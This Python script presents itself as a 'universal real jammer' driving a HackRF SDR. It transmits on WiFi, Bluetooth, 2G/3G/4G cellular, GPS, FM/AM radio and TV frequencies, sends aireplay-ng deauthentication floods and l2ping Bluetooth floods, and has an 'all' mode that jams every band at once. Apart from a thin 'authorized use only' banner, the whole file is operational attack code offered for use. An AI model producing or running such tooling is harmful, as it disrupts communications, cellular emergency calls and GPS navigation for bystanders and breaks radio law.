#!/usr/bin/env python3
"""
Universal Jammer - REAL Jammer for All Frequencies
Supports: WiFi, Bluetooth, 2G/3G/4G, GPS, Radio, TV, etc.
FOR AUTHORIZED TESTING ONLY
"""
import argparse
import logging
import threading
import time
import subprocess
import os
import sys
from dataclasses import dataclass
from datetime import datetime
from typing import Optional, Dict

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("jammer_real.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("RealJammer")

class HardwareController:
    
    @staticmethod
    def check_hackrf():
        try:
            result = subprocess.run(["hackrf_info"], capture_output=True, text=True)
            return "hackrf" in result.stdout.lower()
        except:
            return False
    
    @staticmethod
    def check_rtlsdr():
        try:
            result = subprocess.run(["rtl_test", "-t"], capture_output=True, text=True, timeout=5)
            return True
        except:
            return False
    
    @staticmethod
    def set_wifi_monitor(interface="wlan0"):
        try:
            commands = [
                f"ip link set {interface} down",
                f"iw dev {interface} set type monitor", 
                f"ip link set {interface} up"
            ]
            for cmd in commands:
                subprocess.run(cmd.split(), capture_output=True)
            return True
        except:
            return False

FREQUENCY_BANDS = {
    "wifi": {
        "2.4ghz": [2412000000, 2422000000, 2432000000, 2442000000, 2452000000, 2462000000, 2472000000],
        "5ghz": [5180000000, 5200000000, 5220000000, 5240000000, 5260000000, 5280000000, 5300000000, 5320000000]
    },
    "bluetooth": [2402000000, 2426000000, 2480000000],
    "2g": {
        "gsm900": [935000000, 960000000],
        "gsm1800": [1805000000, 1880000000]
    },
    "3g": {
        "umts2100": [2110000000, 2170000000]
    },
    "4g": {
        "lte800": [791000000, 821000000],
        "lte1800": [1805000000, 1880000000],
        "lte2600": [2620000000, 2690000000]
    },
    "gps": {
        "l1": [1575420000],
        "l2": [1227600000]
    },
    "radio": {
        "fm": [88000000, 108000000],
        "am": [530000, 1710000]
    },
    "tv": {
        "uhf": [470000000, 862000000],
        "vhf": [47000000, 230000000]
    }
}

@dataclass
class JammerConfig:
    jammer_type: str
    frequency: int
    bandwidth: int = 1000000
    power: int = 30
    duration: int = 0
    target: str = ""

class RealJammer:
    def __init__(self, config: JammerConfig):
        self.config = config
        self.running = False
        self.thread = None
        self.hardware = HardwareController()
        
    def start(self):
        if self.running:
            return
            
        self.running = True
        self.thread = threading.Thread(target=self._jam_loop)
        self.thread.daemon = True
        self.thread.start()
        logger.info(f"Started {self.config.jammer_type} jammer on {self.config.frequency}Hz")
        
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()
        logger.info(f"Stopped {self.config.jammer_type} jammer")
        
    def _jam_loop(self):
        start_time = datetime.now()
        
        while self.running:
            try:
                if self.config.duration > 0:
                    if (datetime.now() - start_time).seconds >= self.config.duration:
                        break
                
                self._execute_jamming()
                time.sleep(0.1)
                
            except Exception as e:
                logger.error(f"Jamming error: {e}")
                time.sleep(1)
    
    def _execute_jamming(self):
        jam_type = self.config.jammer_type.lower()
        
        if jam_type == "wifi":
            self._wifi_jam()
        elif jam_type == "bluetooth":
            self._bluetooth_jam()
        elif jam_type in ["2g", "3g", "4g"]:
            self._cellular_jam()
        elif jam_type == "gps":
            self._gps_jam()
        elif jam_type == "radio":
            self._radio_jam()
        elif jam_type == "tv":
            self._tv_jam()
        else:
            self._generic_rf_jam()
    
    def _wifi_jam(self):
        try:
            cmd = [
                "aireplay-ng", 
                "--deauth", "10",
                "-a", self.config.target if self.config.target else "00:11:22:33:44:55",
                "wlan0mon"
            ]
            subprocess.run(cmd, capture_output=True, timeout=5)
            logger.debug("Sent WiFi deauth packets")
        except Exception as e:
            self._hackrf_jam(self.config.frequency, self.config.bandwidth)
    
    def _bluetooth_jam(self):
        try:
            cmd = ["l2ping", "-f", "-s", "600", self.config.target]
            subprocess.run(cmd, capture_output=True, timeout=2)
        except:
            self._hackrf_jam(self.config.frequency, 1000000)
    
    def _cellular_jam(self):
        frequencies = []
        if self.config.jammer_type == "2g":
            frequencies = [935000000, 1805000000]
        elif self.config.jammer_type == "3g":
            frequencies = [2140000000]
        elif self.config.jammer_type == "4g":
            frequencies = [800000000, 1800000000, 2600000000]
        
        for freq in frequencies:
            self._hackrf_jam(freq, 5000000)
    
    def _gps_jam(self):
        self._hackrf_jam(1575420000, 2000000)
        time.sleep(0.1)
        self._hackrf_jam(1227600000, 2000000)
    
    def _radio_jam(self):
        if 88000000 <= self.config.frequency <= 108000000:
            self._hackrf_jam(self.config.frequency, 200000)
        else:
            self._hackrf_jam(self.config.frequency, 10000)
    
    def _tv_jam(self):
        self._hackrf_jam(self.config.frequency, 6000000)
    
    def _generic_rf_jam(self):
        self._hackrf_jam(self.config.frequency, self.config.bandwidth)
    
    def _hackrf_jam(self, frequency: int, bandwidth: int):
        try:
            cmd = [
                "hackrf_transfer",
                "-t", "/dev/zero",
                "-f", str(frequency),
                "-s", str(bandwidth),
                "-x", str(self.config.power),
                "-l", "40",
                "-a", "1",
                "-B", "40000000"
            ]
            
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(0.3)
            process.terminate()
            process.wait()
            
            logger.debug(f"HackRF jam at {frequency}Hz, BW: {bandwidth}")
            
        except Exception as e:
            logger.error(f"HackRF error: {e}")

class JammerManager:
    
    def __init__(self):
        self.jammers: Dict[str, RealJammer] = {}
        self.hardware = HardwareController()
        
    def start_jammer(self, jammer_type: str, frequency: int = 0, **kwargs):
        if frequency == 0:
            frequency = self._get_default_frequency(jammer_type)
        
        config = JammerConfig(
            jammer_type=jammer_type,
            frequency=frequency,
            **kwargs
        )
        
        jammer_id = f"{jammer_type}_{frequency}"
        jammer = RealJammer(config)
        self.jammers[jammer_id] = jammer
        jammer.start()
        
        return jammer_id
    
    def stop_jammer(self, jammer_id: str):
        if jammer_id in self.jammers:
            self.jammers[jammer_id].stop()
            del self.jammers[jammer_id]
    
    def stop_all(self):
        for jammer_id in list(self.jammers.keys()):
            self.stop_jammer(jammer_id)
    
    def _get_default_frequency(self, jammer_type: str) -> int:
        defaults = {
            "wifi": 2412000000,
            "bluetooth": 2402000000,
            "2g": 935000000,
            "3g": 2140000000,
            "4g": 800000000,
            "gps": 1575420000,
            "radio": 100000000,
            "tv": 500000000
        }
        return defaults.get(jammer_type.lower(), 100000000)
    
    def get_status(self):
        status = []
        for jammer_id, jammer in self.jammers.items():
            status.append({
                "id": jammer_id,
                "type": jammer.config.jammer_type,
                "frequency": jammer.config.frequency,
                "running": jammer.running
            })
        return status

def main():
    parser = argparse.ArgumentParser(description="Universal Real Jammer")
    parser.add_argument("type", choices=[
        "wifi", "bluetooth", "2g", "3g", "4g", "gps", "radio", "tv", "all"
    ], help="Type of jamming")
    
    parser.add_argument("-f", "--frequency", type=int, default=0, help="Frequency in Hz")
    parser.add_argument("-t", "--target", type=str, default="", help="Target MAC/BSSID")
    parser.add_argument("-p", "--power", type=int, default=30, help="Transmit power")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Duration in seconds")
    parser.add_argument("-b", "--bandwidth", type=int, default=1000000, help="Bandwidth in Hz")
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("Need root: sudo python3 real_jammer.py")
        sys.exit(1)
    
    hardware = HardwareController()
    if not hardware.check_hackrf():
        print("HackRF not connected - some functions may not work")
    
    print("Universal Real Jammer - FOR AUTHORIZED USE ONLY")
    print("LEGAL WARNING: Unauthorized use is illegal!")
    
    manager = JammerManager()
    
    try:
        if args.type == "all":
            jammers = [
                ("wifi", 2412000000),
                ("bluetooth", 2402000000), 
                ("2g", 935000000),
                ("3g", 2140000000),
                ("4g", 800000000),
                ("gps", 1575420000),
                ("radio", 100000000),
                ("tv", 500000000)
            ]
            
            for jam_type, freq in jammers:
                manager.start_jammer(jam_type, freq, power=args.power, duration=args.duration)
                print(f"Started {jam_type} jammer on {freq}Hz")
                time.sleep(1)
        else:
            jammer_id = manager.start_jammer(
                args.type, 
                args.frequency,
                target=args.target,
                power=args.power,
                duration=args.duration,
                bandwidth=args.bandwidth
            )
            print(f"Started {args.type} jammer on {args.frequency}Hz")
        
        if args.duration > 0:
            print(f"Running for {args.duration} seconds...")
            time.sleep(args.duration)
        else:
            print("Running continuously. Press Ctrl+C to stop.")
            while True:
                time.sleep(1)
                
    except KeyboardInterrupt:
        print("Stopping all jammers...")
    finally:
        manager.stop_all()
        print("All jammers stopped")

if __name__ == "__main__":
    main()
